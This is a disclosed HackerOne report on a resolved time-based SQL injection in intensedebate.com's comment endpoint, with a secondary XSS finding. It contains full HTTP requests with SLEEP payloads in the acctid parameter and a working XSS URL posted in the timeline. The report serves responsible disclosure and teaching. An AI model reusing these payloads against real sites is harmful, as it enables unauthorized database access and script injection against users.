---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2021-01-01
submitted: 2020-11-26T18:12:48.990Z
bounty_usd: null
votes: 130
cve: []
program: "[[programs/automattic|Automattic]]"
reporter: "fuzzme"
source: "https://hackerone.com/reports/1044698"
title: "[intensedebate.com] SQL Injection Time Based On /js/commentAction/"
---
# [intensedebate.com] SQL Injection Time Based On /js/commentAction/

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 130 | **Program:** Automattic | **Disclosed:** 2021-01-01

- Report: [https://hackerone.com/reports/1044698](https://hackerone.com/reports/1044698)
- CWE: SQL Injection
- Submitted: 2020-11-26T18:12:48.990Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

[intensedebate.com] SQLi Time Based On /js/commentAction/

## Summary:

Hello,

I have found a SQLI Injection Time Based on `/js/commentAction/`.

When a user want to submit/reply to a comment, a JSON payload was send by a GET request.


```GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com```

The key `"acctid":"251219"` is vulnerable to SQL Injection Time based


## Detection :

```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(15)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

HTTP Response `15 414 millis`


```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(7)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

HTTP Response `7 660 millis`

Bonus :  the  key`"src":0` is vulnerable to self-XSS, change the value by `"<iframe%20src=%23%20onload=alert('XSS')>"` and you will see a XSS pop-up


## POC

SQLi Time based : sleep_7.png, sleep_15.png and POC.mp4
Self-XSS : Self-XSS.mp4


Thank you, good bye.

Fuzzme.

## Impact

Full database access holding private user information.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **Report Duplicate**
- **2020-11-26** @fuzzme: Hi, ok, no problem, i will post a comment to my initial report.
- **2020-11-26** @fuzzme: Hi @xknown , just thought how it's going to happen for the reward and the reputation , i will rewarded for only one bug ? Or $x bounty peer SQL Injection ? 

I understand to better keep track the issues  is better to post all bugs to my initial report,  but i don't win reputation for the other ones :/ and reputation is so important for me

If you want i can continue to create and a new report and when you `triagged` my report, i post a comment to my initial report.

Thanks.
- **2020-11-26** @fuzzme: Hey @xknow, can you triagged my report ? thanks you.
- **Report Reopened**
- **Report Triaged**
- **2020-12-03** @fuzzme: Thank you :)
- **Report Resolved**
- **Bounty Awarded**
- **2020-12-04** @fuzzme: Hi @xknown, thank you for the bounty.
- **2020-12-06** @fuzzme: Hey @xknown, sorry i don't have do the test for the XSS, and the XSS is not a self-XSS, and is not patched, click to this following link and you will see the XSS pop-up  :
```
https://www.intensedebate.com/js/commentAction/?data={%22request_type%22:%220%22,%20%22params%22:{%20%22firstCall%22:true,%20%22src%22:%220%3Cimg%20src=x%20onerror=alert(%27XSS%27)%3E%22,%20%22blogpostid%22:574575046,%20%22acctid%22:419731,%20%22parentid%22:0,%20%22depth%22:0,%20%22type%22:0,%20%22token%22:%22%22,%20%22anonName%22:%22yyy%22,%20%22anonEmail%22:%22yyy@gmail.com%22,%20%22anonURL%22:%22%22,%20%22userid%22:undefined,%20%22token%22:%22undefined%22,%20%22mblid%22:%22%22,%20%22tweetThis%22:%22F%22,%20%22subscribeThis%22:%22-1%22,%20%22comment%22:%22test%22}}
```
- **2020-12-08** @xknown: Hi @fuzzme, the XSS issues are being fixed as part of another report we received previous to this one.
- **Agreed On Going Public**
- **2020-12-21** @fuzzme: @xknown, @Automattic update ?
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
- **2021-01-01** @fuzzme: wow thank you so much <3
